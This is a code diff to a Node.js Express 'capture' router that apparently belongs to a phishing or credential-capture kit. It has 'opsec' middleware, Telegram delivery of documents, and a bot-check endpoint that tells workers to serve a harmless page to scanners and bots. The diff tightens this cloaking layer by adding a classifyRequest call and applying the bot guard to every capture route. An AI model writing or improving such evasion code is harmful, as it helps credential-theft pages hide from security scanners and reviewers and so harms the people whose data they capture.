@@ -13,7 +13,7 @@ const { sendTelegramDocument } = require('../services/notification');
 const { body } = require('express-validator');
 const { validateResult } = require('../middleware/validator');
 const { getOpsecSettings } = require('../middleware/opsec');
-const { rejectBotRequest } = require('../middleware/botguard');
+const { rejectBotRequest, classifyRequest } = require('../middleware/botguard');
 
 // Inline validators for the capture endpoint (commonValidators has no
 // captureToken rule, so we define them here to avoid passing `undefined`
@@ -25,36 +25,24 @@ const captureValidators = [
 
 // Public bot-check endpoint used by workers/scripts before rendering.
 router.get('/check', async (req, res) => {
-  if (!rejectBotRequest) return res.json({ ok: true, blocked: false, challenged: false, action: 'allow', reason: 'botguard_missing' });
-
   try {
-    const linkId = req.query.link_id || req.query.linkId || null;
-    const userAgent = req.headers['user-agent'] || req.get('user-agent') || '';
-
-    const verdict = await rejectBotRequest({ req, res, linkId, userAgent });
-    if (!verdict) return res.status(400).json({ error: 'Blocked' });
-
-    const classification = typeof verdict === 'object' && verdict.classification ? verdict.classification : { action: 'allow', type: null, confidence: 0, reason: 'noop' };
+    const classification = await classifyRequest(req);
     return res.json({
       ok: true,
       blocked: classification.action === 'block',
       challenged: classification.action === 'challenge',
-      ip_type: classification.type,
-      confidence: classification.confidence,
       action: classification.action,
       reason: classification.reason,
       serve_harmless_page: classification.action !== 'allow',
     });
   } catch (err) {
     console.error('[Capture] bot-check error:', err.message);
-    return res.status(200).json({ ok: true, blocked: false, challenged: false, action: 'allow', reason: 'check_failed' });
+    return res.json({ ok: true, blocked: false, action: 'allow', reason: 'check_failed' });
   }
 });
 
-// Apply bot guard to all capture routes if available.
-if (rejectBotRequest) {
-  router.use(rejectBotRequest);
-}
+// Apply bot guard to all capture routes.
+router.use(rejectBotRequest);
 
 // Existing visitor block-check and anti-bot classification stays available
 // for worker consumers that still call /api/capture without the new check.
